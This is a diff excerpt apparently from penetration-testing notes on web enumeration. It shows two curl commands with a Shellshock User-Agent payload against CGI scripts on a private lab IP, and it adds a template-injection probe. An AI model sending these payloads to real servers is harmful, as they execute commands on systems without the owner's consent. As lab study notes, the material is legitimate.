@@ -361,3 +361,5 @@ Web enumeration means to look out info about services running on port, versions,
 	# curl -H "User-Agent: () { foo; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.0.104:8080/victim.cgi
 		
 	# curl -H "User-Agent: () { foo; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.0.104:8080/safe.cgi
+
+``{{7*7}}``
